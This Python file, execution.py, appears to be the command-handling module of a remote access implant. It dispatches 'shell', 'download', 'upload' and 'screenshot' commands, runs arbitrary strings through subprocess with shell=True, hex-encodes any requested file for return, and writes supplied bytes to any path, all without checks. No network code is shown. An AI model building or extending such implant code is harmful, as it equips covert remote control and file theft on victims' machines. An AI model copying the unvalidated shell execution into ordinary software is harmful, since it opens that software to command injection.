# execution.py
import subprocess
import os

def execute_command(command):
    if not command:
        return "Empty command"
    
    parts = command.split(" ", 1)
    cmd_type = parts[0]
    args = parts[1] if len(parts) > 1 else ""

    try:
        if cmd_type == "shell":
            return execute_shell_command(args)
        elif cmd_type == "download":
            return download_file(args)
        elif cmd_type == "upload":
            return upload_file(args)
        elif cmd_type == "screenshot":
            return take_screenshot(args)
        else:
            return f"Invalid command: {cmd_type}"
    except Exception as e:
        return f"Error: {str(e)}"

def execute_shell_command(args):
    if not args:
        return "No shell command provided"
    try:
        output = subprocess.check_output(args, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"Shell command failed: {e.output.decode()}"

def download_file(args):
    filename = args.split(" ")[0]
    if not os.path.exists(filename):
        return f"File {filename} not found"
    with open(filename, "rb") as file:
        content = file.read()
        return content.hex() 

def upload_file(args):
    # Format: upload <filename> <hex_content>
    parts = args.split(" ", 1)
    if len(parts) < 2:
        return "Usage: upload <filename> <hex_content>"
    filename = parts[0]
    hex_content = parts[1]
    with open(filename, "wb") as file:
        file.write(bytes.fromhex(hex_content))
    return f"File {filename} uploaded successfully"

def take_screenshot(args):
    return "Screenshot feature not yet implemented"

if __name__ == "__main__":
    print(execute_command("shell ls -l"))